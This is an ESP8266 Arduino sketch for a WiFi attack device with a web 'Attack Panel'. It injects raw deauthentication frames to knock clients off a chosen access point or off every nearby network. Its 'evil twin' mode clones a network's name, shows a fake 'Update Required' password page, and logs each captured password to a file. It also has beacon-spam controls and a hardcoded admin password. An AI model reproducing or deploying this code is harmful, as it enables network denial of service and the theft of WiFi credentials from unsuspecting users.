#include <Arduino.h>
#include <ESP8266WiFi.h>
#include <ESP8266WebServer.h>
#include <DNSServer.h>
#include <LittleFS.h>

// ==================== WIFIX ENGINE (LOW LEVEL PACKET) ==================== //
extern "C" {
#include "user_interface.h"
  int wifi_send_pkt_freedom(uint8 *buf, int len, bool sys_seq);
}

// ==================== CONFIG & STATE ==================== //
ESP8266WebServer server(80);
DNSServer dnsServer;

String admin_ssid = "GMpro2"; 
String admin_pass = "Sangkur87";
String selected_mac = "";
String selected_ssid = "";
int target_ch = 1;

bool deauth_on = false;
bool mass_deauth_on = false;
bool beacon_on = false;
bool etwin_on = false;

struct Net {
  String ssid;
  String bssid_str;
  uint8_t bssid[6];
  int ch;
};
Net _nets[16];
int net_count = 0;

// ==================== HTML ORI GMPRO87 ==================== //
const char INDEX_HTML[] PROGMEM = R"=====(
<!DOCTYPE html>
<html>
<head>
    <meta name='viewport' content='initial-scale=1.0, width=device-width'>
    <title>GMpro87 Admin Panel</title>
    <style>
        body { font-family: 'Courier New', Courier, monospace; background: #0d0d0d; color: #00ff00; margin: 0; padding: 10px; }
        .content { max-width: 500px; margin: auto; border: 1px solid #00ff00; padding: 15px; box-sizing: border-box; }
        .header-box { text-align: center; border-bottom: 2px solid #00ff00; padding-bottom: 10px; margin-bottom: 15px; }
        .tabs { display: flex; gap: 5px; margin-bottom: 15px; }
        .tabs button { flex: 1; background: #222; color: #00ff00; border: 1px solid #00ff00; padding: 10px; cursor: pointer; font-weight: bold; font-size: 10px; }
        .active-btn { background: #00ff00 !important; color: #000 !important; }
        .tab-content { display: none; border-top: 1px solid #333; padding-top: 15px; }
        .show { display: block; }
        table { width: 100%; border-collapse: collapse; margin-top: 10px; font-size: 9px; table-layout: fixed; }
        th, td { border: 1px solid #00ff00; padding: 4px 2px; text-align: center; overflow: hidden; white-space: nowrap; }
        th { background: #1a1a1a; }
        .btn { background: #000; color: #00ff00; border: 1px solid #00ff00; padding: 8px; cursor: pointer; font-size: 9px; width: 100%; display: block; box-sizing: border-box; margin-bottom: 5px; text-align: center; text-decoration: none; text-transform: uppercase; }
        .btn:active { background: #00ff00; color: #000; }
        input, select { background: #000; color: #0f0; border: 1px solid #0f0; padding: 6px; width: 100%; box-sizing: border-box; margin-bottom: 10px; font-family: 'Courier New'; }
        textarea { width: 100%; background: #000; color: #0f0; border: 1px solid #0f0; font-size: 10px; margin-top: 10px; }
        label { font-size: 11px; display: block; margin-bottom: 3px; }
        .upload-section { border: 1px dashed #00ff00; padding: 10px; margin-bottom: 15px; }
    </style>
</head>
<body>
    <div class='content'>
        <div class='header-box'><h2>GMpro87</h2><span>by : 9u5M4n9</span></div>
        <div class='tabs'>
            <button id='btn-m' class='active-btn' onclick='openTab("m")'>MAIN</button>
            <button id='btn-a' onclick='openTab("a")'>ATTACK</button>
            <button id='btn-s' onclick='openTab("s")'>SETTING</button>
        </div>
        <div id='m' class='tab-content show'>
            <button class='btn' style='background:#0f0; color:#000; font-weight:bold;' onclick='location="/?scan=1"'>RESCAN NETWORKS</button>
            <div style='display:flex; gap:5px; margin-top:5px;'>
                <a href='/?deauth={D_VAL}' style='flex:1'><button class='btn' style='{D_STYLE}'>{D_TXT}</button></a>
                <a href='/?hotspot={H_VAL}' style='flex:1'><button class='btn' style='{H_STYLE}'>{H_TXT}</button></a>
            </div>
            <table>
                <thead><tr><th style='width:30%'>SSID</th><th style='width:10%'>CH</th><th style='width:30%'>BSSID</th><th style='width:30%'>SELECT</th></tr></thead>
                <tbody>{NET_LIST}</tbody>
            </table>
        </div>
        <div id='a' class='tab-content'>
            <h3>Attack Panel</h3>
            <a href='/?mass={M_VAL}'><button class='btn' style='{M_STYLE}'>{M_TXT}</button></a>
            <a href='/?beacon={B_VAL}'><button class='btn' style='{B_STYLE}'>{B_TXT}</button></a>
        </div>
        <div id='s' class='tab-content'>
            <div class='upload-section'>
                <form action='/upload' method='POST' enctype='multipart/form-data'>
                    <input type='file' name='f'><button type='submit' class='btn' style='background:#0f0; color:#000;'>UPLOAD</button>
                </form>
            </div>
            <form action='/save'>
                <label>SSID:</label><input name='s_ssid' value='{SSID_VAL}'>
                <label>PASS:</label><input name='s_pass' value='{PASS_VAL}'>
                <button class='btn' style='background:#0f0; color:#000;'>SAVE & RESTART</button>
            </form>
        </div>
        <textarea rows='6' readonly>{LOGS}</textarea>
    </div>
    <script>
        function openTab(t){
            document.querySelectorAll('.tab-content').forEach(x=>x.classList.remove('show'));
            document.querySelectorAll('.tabs button').forEach(x=>x.classList.remove('active-btn'));
            document.getElementById(t).classList.add('show');
            document.getElementById('btn-'+t).classList.add('active-btn');
        }
    </script>
</body>
</html>
)=====";

// ==================== ENGINE HANDLERS ==================== //

void handleRoot() {
  if (server.hasArg("scan")) {
    net_count = WiFi.scanNetworks();
    for (int i = 0; i < net_count && i < 16; i++) {
      _nets[i].ssid = WiFi.SSID(i);
      _nets[i].bssid_str = WiFi.BSSIDstr(i);
      _nets[i].ch = WiFi.channel(i);
      for (int j = 0; j < 6; j++) _nets[i].bssid[j] = WiFi.BSSID(i)[j];
    }
  }

  if (server.hasArg("ap_idx")) {
    int idx = server.arg("ap_idx").toInt();
    selected_mac = _nets[idx].bssid_str;
    selected_ssid = _nets[idx].ssid;
    target_ch = _nets[idx].ch;
  }

  if (server.hasArg("deauth")) deauth_on = (server.arg("deauth") == "1");
  if (server.hasArg("mass")) mass_deauth_on = (server.arg("mass") == "1");
  if (server.hasArg("beacon")) beacon_on = (server.arg("beacon") == "1");
  if (server.hasArg("hotspot")) {
    etwin_on = (server.arg("hotspot") == "1");
    if (etwin_on) { WiFi.softAPdisconnect(true); WiFi.softAP(selected_ssid.c_str()); dnsServer.start(53, "*", WiFi.softAPIP()); }
    else { dnsServer.stop(); WiFi.softAPdisconnect(true); WiFi.softAP(admin_ssid.c_str(), admin_pass.c_str()); }
  }

  String s = FPSTR(INDEX_HTML);
  s.replace("{D_TXT}", deauth_on ? "STOP DEAUTH" : "START DEAUTH");
  s.replace("{D_VAL}", deauth_on ? "0" : "1");
  s.replace("{D_STYLE}", deauth_on ? "background:#f00;color:#fff;" : "");
  s.replace("{H_TXT}", etwin_on ? "STOP ETWIN" : "START ETWIN");
  s.replace("{H_VAL}", etwin_on ? "0" : "1");
  s.replace("{H_STYLE}", etwin_on ? "background:#f00;color:#fff;" : "");
  s.replace("{M_TXT}", mass_deauth_on ? "STOP MASS DEAUTH" : "START MASS DEAUTH");
  s.replace("{M_VAL}", mass_deauth_on ? "0" : "1");
  s.replace("{M_STYLE}", mass_deauth_on ? "background:#f00;color:#fff;" : "");
  s.replace("{B_TXT}", beacon_on ? "STOP BEACON SPAM" : "START BEACON SPAM");
  s.replace("{B_VAL}", beacon_on ? "0" : "1");
  s.replace("{B_STYLE}", beacon_on ? "border-color:#f0f;color:#f0f;" : "");

  String table = "";
  for (int i = 0; i < 16; i++) {
    if (_nets[i].ssid == "") break;
    bool isSel = (selected_mac == _nets[i].bssid_str);
    table += "<tr " + String(isSel?"style='background:#004400'":"") + "><td>" + _nets[i].ssid + "</td><td>" + String(_nets[i].ch) + "</td><td>" + _nets[i].bssid_str + "</td>";
    table += "<td><a href='/?ap_idx=" + String(i) + "'><button class='btn' style='padding:2px;'>SELECT</button></a></td></tr>";
  }
  s.replace("{NET_LIST}", table);
  
  File f = LittleFS.open("/log.txt", "r");
  String logs = f ? f.readString() : "[LOG] System Ready.\n"; f.close();
  s.replace("{LOGS}", logs + "[TARGET] " + selected_ssid);
  s.replace("{SSID_VAL}", admin_ssid); s.replace("{PASS_VAL}", admin_pass);

  server.send(200, "text/html", s);
}

void sendDeauth(uint8_t* bssid, int ch) {
  wifi_set_channel(ch);
  uint8_t pkt[26] = {0xC0,0x00,0x3A,0x01, 0xFF,0xFF,0xFF,0xFF,0xFF,0xFF, 0x00,0x00,0x00,0x00,0x00,0x00, 0x00,0x00,0x00,0x00,0x00,0x00, 0x00,0x00,0x01,0x00};
  memcpy(&pkt[10], bssid, 6); memcpy(&pkt[16], bssid, 6);
  wifi_send_pkt_freedom(pkt, 26, 0);
}

void setup() {
  LittleFS.begin(); WiFi.mode(WIFI_AP_STA);
  WiFi.softAP(admin_ssid.c_str(), admin_pass.c_str());
  server.on("/", handleRoot);
  server.on("/save", [](){ admin_ssid=server.arg("s_ssid"); admin_pass=server.arg("s_pass"); ESP.restart(); });
  server.onNotFound([](){ if(etwin_on){ server.send(200, "text/html", "<h2>Update Required</h2><form action='/l'><input name='p' type='password'><input type='submit'></form>"); } else { handleRoot(); } });
  server.on("/l", [](){ File f=LittleFS.open("/log.txt","a"); f.println("Pass: "+server.arg("p")); f.close(); server.send(200,"text/plain","OK"); });
  server.begin();
}

void loop() {
  server.handleClient(); dnsServer.processNextRequest();
  static unsigned long last = 0;
  if (millis() - last > 100) {
    if (deauth_on && selected_mac != "") {
      uint8_t m[6]; sscanf(selected_mac.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &m[0],&m[1],&m[2],&m[3],&m[4],&m[5]);
      sendDeauth(m, target_ch);
    }
    if (mass_deauth_on) {
      for(int i=0; i<net_count; i++) sendDeauth(_nets[i].bssid, _nets[i].ch);
    }
    last = millis();
  }
}
